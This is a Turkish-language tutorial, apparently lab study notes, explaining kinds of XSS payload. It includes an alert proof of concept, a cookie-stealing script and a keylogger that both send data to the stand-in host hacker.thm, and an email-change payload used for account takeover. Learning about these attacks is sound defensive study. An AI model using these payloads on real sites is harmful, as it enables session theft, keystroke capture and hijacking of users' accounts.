**Payload** nedir?

XSS saldırılarında, payload hedefin bilgisayarında çalıştırılmasını istediğimiz JavaScript kodudur. Payload'ın iki bileşeni vardır:
- **İntention (Niyet)**: JavaScript'in gerçekte ne yapmasını istediğimiz
- **Modification (Değişiklik)**: Kodun her senaryoda çalışması için yapması gereken değişiklikler

---

## Payload Türleri ve Örnekleri

### 1. Proof Of Concept (PoC)

**Amaç**: Bir web sitesinde XSS açığını gösterir/kanıtlamak

**Özellikler**:
- En basit payload türüdür
- Sayfada bir uyarı kutusu açar
- Saldırganın yetkisini gösterir

**Örnek Kod**:
```javascript
<script>alert('XSS');</script>
```

---

### 2. Session Stealing (Oturum Çalma)

**Amaç**: Hedefin oturum bilgilerini (login token, cookies) çalmak

**Nasıl Çalışır**:
1. Hedefin cookie'sini alır
2. Base64 ile encode eder (güvenli iletim için)
3. Saldırganın kontrol ettiği sunucuya gönderir
4. Saldırgan bu cookie'leri kullanarak hedefin hesabına giriş yapar

**Örnek Kod**:
```javascript
<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>
```

**Risk Seviyesi**: 🔴 Çok Yüksek (Tam Hesap Kontrolü)

---

### 3. Key Logger (Tuş Kaydedici)

**Amaç**: Hedefin web sitesinde yazdığı her şeyi kaydetmek

**Nasıl Çalışır**:
1. Kullanıcının tuş basışlarını izler
2. Yazılan karakterleri saldırganın sunucusuna gönderir
3. Base64 ile encode edilerek iletilir

**Örnek Kod**:
```javascript
<script>
  document.onkeypress = function(e) { 
    fetch('https://hacker.thm/log?key=' + btoa(e.key));
  }
</script>
```

**Risk Senaryoları**:
- Giriş bilgileri (kullanıcı adı, şifre)
- Kredi kartı numaraları
- Kişisel bilgiler
- E-posta adresleri

**Risk Seviyesi**: 🔴 Çok Yüksek (Finansal & Kişisel Veri Hırsızlığı)

---

### 4. Business Logic (İş Mantığı)

**Amaç**: Hedef web sitesinin belirli fonksiyonlarını çağırmak ve değiştirmek

**Nasıl Çalışır**:
1. Web sitesinin JavaScript fonksiyonlarını çağırır
2. Kullanıcı adına işlemler gerçekleştirir
3. Hesap ayarlarını veya verilerini değiştirir

**Örnek Kod**:
```javascript
<script>user.changeEmail('attacker@hacker.thm');</script>
```

**Saldırı Zinciri Örneği**:
1. E-posta adresini `attacker@hacker.thm` olarak değiştirir
2. Şifre sıfırlama isteği gönderir
3. Saldırganın e-postasına reset linki gelir
4. Saldırgan hesaba tam erişim elde eder

**Risk Seviyesi**: 🔴 Çok Yüksek (Tam Hesap Kontrolü)

---

## Payload Bileşenleri Özeti

| Bileşen | Açıklama | Örnek |
|---------|----------|--------|
| **İntention** | Payload'ın gerçek amacı | Oturum çalma, tuş kaydetme |
| **Modification** | Koda yapılan değişiklikler | Hedef URL'si, encode yöntemi |
| **Execution Context** | Payload'ın çalıştığı ortam | DOM, Event Handler, Script Tag |
